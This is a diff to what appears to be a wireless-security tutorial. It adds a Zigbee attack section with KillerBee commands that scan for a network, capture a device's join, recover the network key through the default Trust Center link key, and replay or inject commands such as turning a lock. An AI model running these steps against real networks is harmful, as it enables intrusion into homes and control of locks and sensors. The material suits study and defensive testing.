@@ -21,13 +21,26 @@ Both hop and mesh, so capturing traffic means following the network, not just a 
 
 Zigbee's headline issue has been **key transport during joining**. In some configurations a device receives the network key encrypted with a well-known default **Trust Center link key** (historically a published value). If you sniff the moment a device joins, you capture the network key and can then decrypt all mesh traffic and inject commands.
 
-So the high-value capture window is **device onboarding**:
+So the high-value capture window is **device onboarding**.
 
-- Sniff while a new bulb or sensor pairs to the hub.
-- Extract the network key from the join exchange.
-- Decrypt the mesh and craft commands (turn a lock, read a sensor).
+### Attack — capture the network key at join
+
+**Gear:** an 802.15.4 sniffer (CC2531/CC2652, nRF52840, RZUSBstick) + **KillerBee** + Wireshark.
+
+```bash
+zbstumbler                              # find the network and its channel
+zbdump -c <channel> -w join.pcap        # capture while you trigger a device to pair
+# open join.pcap in Wireshark; if the deployment uses the default Trust Center
+# link key (a published value), set it in Zigbee prefs and Wireshark decrypts the
+# Transport Key frame -> the network key is revealed.
+zbreplay -c <channel> -r cmd.pcap       # replay/inject an application command
+```
+
+Steps: scan → start the capture → trigger onboarding of a new bulb/sensor → extract the network key from the encrypted Transport Key frame → decrypt the mesh and craft commands (turn a lock, read a sensor).
 
 Modern Zigbee 3.0 improved this with install codes and per-device link keys, but many deployed devices and hubs still fall back to weak defaults.
+
+**Success condition:** Wireshark decrypts mesh traffic with the recovered network key.
 
 ## Thread
 
